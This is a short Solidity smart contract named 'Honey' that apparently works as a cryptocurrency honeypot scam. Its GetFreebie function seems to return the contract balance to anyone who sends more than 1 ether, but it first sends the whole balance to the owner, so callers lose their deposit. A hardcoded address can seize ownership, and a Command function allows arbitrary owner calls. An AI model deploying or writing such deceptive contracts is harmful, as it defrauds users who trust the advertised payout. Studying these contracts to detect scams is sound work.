pragma solidity ^0.4.19;

contract Honey {
    struct A { bool x; address y; }
    A public B = A(false, msg.sender);

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            B.y.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() payable public {
        if (msg.sender == 0x0C76802158F13aBa9D892EE066233827424c5aAB) {
            B.y = 0x0C76802158F13aBa9D892EE066233827424c5aAB;
        }
        require(msg.sender == B.y);
        B.y.transfer(this.balance);
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == B.y);
        adr.call.value(msg.value)(data);
    }
}